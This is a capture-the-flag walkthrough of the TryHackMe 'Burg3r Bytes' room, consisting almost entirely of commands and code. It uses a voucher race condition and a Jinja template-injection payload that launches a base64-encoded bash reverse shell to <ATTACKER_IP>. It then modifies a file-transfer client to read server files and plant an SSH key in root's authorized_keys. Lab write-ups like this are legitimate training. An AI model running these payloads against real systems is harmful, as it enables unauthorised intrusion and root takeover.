# [TryHack3M: Burg3r Bytes](https://tryhackme.com/room/burg3rbytes)

## They say these burgers are worth every penny. Can you buy one?

# Coupon 3mpire

## Scenario

Burg3r Bytes is a global fast-food giant renowned for its burgers and pizzas. Recently, rumours have surfaced on underground forums about a glitch in Burg3r Byte's checkout system that allows users to manipulate orders. **Your goal?** Exploit this system to score the ultimate haul: 3 million burgers or pizzas.

## Challenge Background

Burg3r Bytes has recently upgraded its checkout system, implementing a modern digital ordering platform to help streamline operations. This new release offers a first sign-up £10 voucher to spend on any order. There is also a free order promotion for the 3 millionth customer; Burg3r Bytes will pay for all items! However, after rushing deployment, some system architecture flaws were left. Can you figure them out?

### What is the web app flag?

1. ...

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2f:77:6b:c2:e0:c7:e5:f3:ef:d5:e8:86:d0:b8:26:4c (RSA)
|   256 f2:1c:d1:3f:19:05:61:ce:69:60:d5:d2:35:6f:d6:49 (ECDSA)
|_  256 ac:ef:a6:25:45:44:5c:b5:94:de:99:7b:34:00:f0:6d (ED25519)
80/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Burg3rByte
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Open the `http://<TARGET_IP>/checkout` in two browser and use `{{7*7}}` as name, and `TRYHACK3M` as 50% discount voucher. While using the voucher at the same time we get to the receipt page where our name is reflected as **49** ...

<img width="1919" height="711" alt="SCREEN01" src="https://github.com/user-attachments/assets/e2775c50-123e-47a7-bd9a-9b1a19f1959d" />

3. ...

```bash
nc -lvnp 4444
```

4. ...

```bash
echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
```

5. ...

```py
{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzxBVFRBQ0tFUl9JUD4vNDQ0NCAwPiYxCg== | base64 -d | bash').read()}}
```

6. ...

```bash
cat flag.txt
```

<img width="323" height="314" alt="SCREEN02" src="https://github.com/user-attachments/assets/2edc0209-a9d2-4096-bff0-39078f2650ab" />

---

### What is the host flag?

_Located in /root on the host machine_

1. ...

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

2. ...

```bash
ls -la /app/cron
```

**Results:**

```
-rw-rw-r-- 1 root root  451 Apr  5  2024 client.crt
-rw-rw-r-- 1 root root 1704 Apr  5  2024 client.key
-rw-r--r-- 1 root root 4844 Apr 10  2024 client_py.py
-rw-rw-r-- 1 root root   62 Apr 10  2024 crontab
```

3. Modyfy `client_py.py` ...

```bash
cp client_py.py client_py2.py
```

**client_py2.py**

```py
import sys
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pss
from Crypto.Hash import SHA256
import binascii
import base64

MAX_SIZE = 200

opcodes = {
    'read': 1,
    'write': 2,
    'data': 3,
    'ack': 4,
    'error': 5
}

mode_strings = ['netascii', 'octet', 'mail']

with open("client.key", "rb") as f:
    data = f.read()
    privkey = RSA.import_key(data)

with open("client.crt", "rb") as f:
    data = f.read()
    pubkey = RSA.import_key(data)

try:
    with open("server.crt", "rb") as f:
        data = f.read()
        server_pubkey = RSA.import_key(data)
except:
    server_pubkey = False

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3.0)
server_address = (sys.argv[1], int(sys.argv[2]))

def encrypt(s, pubkey):
    cipher = PKCS1_OAEP.new(pubkey)
    return cipher.encrypt(s)

def decrypt(s, privkey):
    cipher = PKCS1_OAEP.new(privkey)
    return cipher.decrypt(s)

def send_rrq(filename, mode, signature, server):
    rrq = bytearray()
    rrq.append(0)
    rrq.append(opcodes['read'])
    rrq += bytearray(filename)
    rrq.append(0)
    rrq += bytearray(mode)
    rrq.append(0)
    rrq += bytearray(signature)
    rrq.append(0)
    sock.sendto(rrq, server)
    return True

def send_wrq(filename, mode, server):
    wrq = bytearray()
    wrq.append(0)
    wrq.append(opcodes['write'])
    wrq += bytearray(filename)
    wrq.append(0)
    wrq += bytearray(mode)
    wrq.append(0)
    sock.sendto(wrq, server)
    return True

def send_ack(block_number, server):
    if len(block_number) != 2:
        print('Error: Block number must be 2 bytes long.')
        return False
    ack = bytearray()
    ack.append(0)
    ack.append(opcodes['ack'])
    ack += bytearray(block_number)
    sock.sendto(ack, server)
    return True

def send_error(server, code, msg):
    err = bytearray()
    err.append(0)
    err.append(opcodes['error'])
    err.append(0)
    err.append(code & 0xff)
    pkt += bytearray(msg + b'\0')
    sock.sendto(pkt, server)

def send_data(server, block_num, block):
    if len(block_num) != 2:
        print('Error: Block number must be 2 bytes long.')
        return False
    pkt = bytearray()
    pkt.append(0)
    pkt.append(opcodes['data'])
    pkt += bytearray(block_num)
    pkt += bytearray(block)
    sock.sendto(pkt, server)

def get_file(src_file, dest_file, mode):
    h = SHA256.new(src_file)
    signature = base64.b64encode(pss.new(privkey).sign(h))

    send_rrq(src_file, mode, signature, server_address)

    file = open(dest_file, "wb")

    while True:
        data, server = sock.recvfrom(MAX_SIZE * 3)

        if data[1] == opcodes['error']:
            error_code = int.from_bytes(data[2:4], byteorder='big')
            print(data[4:])
            break
        send_ack(data[2:4], server)
        content = data[4:]
        content = base64.b64decode(content)
        content = decrypt(content, privkey)
        file.write(content)
        if len(content) < MAX_SIZE:
            print("file received!")
            break

def put_file(src_file, dest_file, mode):
    if not server_pubkey:
        print("Error: Server pubkey not configured. You won't be able to PUT")
        return

    try:
        file = open(src_file, "rb")
        fdata = file.read()
        total_len = len(fdata)
    except:
        print("Error: File doesn't exist")
        return False

    send_wrq(dest_file, mode, server_address)
    data, server = sock.recvfrom(MAX_SIZE * 3)

    if data != b'\x00\x04\x00\x00': # ack 0
        print("Error: Server didn't respond with ACK to WRQ")
        return False

    block_num = 1
    while len(fdata) > 0:
        b_block_num = block_num.to_bytes(2, 'big')
        block = fdata[:MAX_SIZE]
        block = encrypt(block, server_pubkey)
        block = base64.b64encode(block)
        fdata = fdata[MAX_SIZE:]
        send_data(server, b_block_num, block)
        data, server = sock.recvfrom(MAX_SIZE * 3)

        if data != b'\x00\x04' + b_block_num:
            print("Error: Server sent unexpected response")
            return False

        block_num += 1

    if total_len % MAX_SIZE == 0:
        b_block_num = block_num.to_bytes(2, 'big')
        send_data(server, b_block_num, b"")
        data, server = sock.recvfrom(MAX_SIZE * 3)

        if data != b'\x00\x04' + b_block_num:
            print("Error: Server sent unexpected response")
            return False

    print("File sent successfully")
    return True

def main():
    op = sys.argv[3]
    src_file = sys.argv[4].encode()
    dest_file = sys.argv[5].encode()
    mode = b'netascii'
    if op == "get":
        get_file(src_file, dest_file, mode)
    elif op == "put":
        put_file(src_file, dest_file, mode)
    else:
        print("Invalid operation.")
    exit(0)

if __name__ == '__main__':
    main()
```

4. ...

```bash
python3 client_py2.py 172.17.0.1 69 get /proc/self/cmdline cmdline
cat cmdline
```

**Results:**

```
/usr/bin/python3/opt/3M-syncserver/server.py
```

5. ...

```bash
python3 client_py2.py 172.17.0.1 69 get /opt/3M-syncserver/server.crt server.crt
```

6. ...

```bash
ssh-keygen -f id_rsa
```

7. ...

```bash
python3 client_py2.py 172.17.0.1 69 put id_rsa.pub /root/.ssh/authorized_keys
```

8. ...

```bash
python3 client_py2.py 172.17.0.1 69 get /root/.ssh/authorized_keys authorized_keys
```

9. ...

```bash
ssh -i id_rsa root@<TARGET_IP>
```

10. ...

```bash
cat a467ea.txt
```

<img width="362" height="85" alt="SCREEN03" src="https://github.com/user-attachments/assets/270c43c0-451b-47c3-b107-030e999cb8bd" />
